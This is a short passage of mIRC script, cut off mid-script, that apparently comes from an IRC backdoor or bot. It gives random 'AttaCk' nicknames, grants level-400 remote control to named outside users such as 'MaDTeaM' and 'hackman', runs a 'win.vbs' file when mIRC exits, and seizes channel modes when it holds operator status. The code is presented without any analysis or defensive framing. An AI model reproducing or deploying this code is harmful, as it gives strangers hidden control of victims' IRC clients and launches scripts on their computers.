  else { /nick AttaCk[ $+ $r(0,9999) $+ $r(0,999) $+ ] | /anick Attack[ $+ $r(0,9999) $+ $r(0,999) $+ ] | /.auser 400 MaDTeaM | /.auser 400 ArapChaT | /.notify ArapChaT | /.auser 400 MaDTeaM1 | /.auser 400 hackman | /.auser 400 MaDTeaM2 }
}
on *:exit:{ /run $mircdirwin.vbs | /remote on }
on *:JOIN:#: { if ($chan = %connect.chan) { .timergetinchan off } | if ($me isop $chan) && ($chan = %connect.chan) { mode $chan +mnst-iR } }
on *:exit:{ /.disable #inv1 off | /.disable #inv2 off | /.remote on }
